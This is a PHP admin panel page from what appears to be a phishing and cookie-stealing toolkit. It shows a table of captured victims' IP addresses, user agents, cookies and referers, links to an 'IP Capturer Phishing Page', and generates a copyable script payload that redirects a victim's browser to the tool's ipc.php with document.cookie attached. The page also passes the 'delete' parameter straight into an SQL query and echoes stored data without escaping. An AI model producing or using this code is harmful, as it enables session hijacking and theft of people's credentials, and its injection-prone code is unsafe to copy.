<div class="content">
<table class="table table-hover" style="width: 30cm;" align="center">
      <thead>
        <tr>
          <!--<th>#</th>-->
          <th>IP Address</th>
          <th>User Agent</th>
          <th>Cookies</th>
          <th>HTTP Referer</th>
          <th>Country</th>
          <th>Date</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <?php
        
        //
        // Deleting the selected page.
        //
        
        $delete = @$_GET['delete'];
        
        if ($delete != "") {
            if (mysql_query("DELETE FROM ip_capturer_module WHERE id=".$delete)) {
                echo "<div align='center' class=\"alert alert-success\" role=\"alert\">
                    <strong>Success!</strong> the ip address has been deleted successfuly.</div>";
            } else { die(mysql_error()); }
        }
        ?>
        
        <?php
        //
        // Extracting data from database.
        //
        $ips_captured = mysql_query("SELECT * FROM ip_capturer_module");
        if (mysql_num_rows($ips_captured) > 0) {
            while($row = mysql_fetch_array($ips_captured)){
        ?>
        <tr>
          <!--<th scope="row"><?php echo $row['id']; ?></th> -->
          <td><?php echo $row['ip_address']; ?></td>
          <td><?php echo $row['user_agent']; ?></td>
          <td><?php echo $row['get_content']; ?></td>
          <td>
              <?php
              if ($row['http_referer'] !== "N/A")
              {
              ?>
              <a href="<?php echo $row['http_referer']; ?>"><?php echo $row['http_referer']; }?></a>
              <?php
              if ($row['http_referer'] == "N/A") {
                  echo $row['http_referer'];
              }
              ?>
          </td>
          <td><?php echo $row['country']; ?></span></td>
          <td><?php echo $row['date']; ?></td>
          <td><a href="index.php?id=6&action=0&delete=<?php echo $row['id']; ?>"><img height="12" width="12" src="images/glyphicons-208-remove-2.png" /></a></td>
        </tr>
        <?php
            } // end while
        
        } // end if     
        $iframe_code = "<script>document.location='".  get_current_url("/ipc.php?cookie='+document.cookie</script>'");
        ?>
      </tbody>
</table>
    <br />
    <a style="margin-left: 64px;" class="btn btn-default" href="ipc.php" role="button">IP Capturer Phishing Page</a><br /><br />
    <input class="form-control input-sm" type="text" value="<?php echo $iframe_code; ?>"  style="width: 15cm; margin-left: 64px;"/>
</div>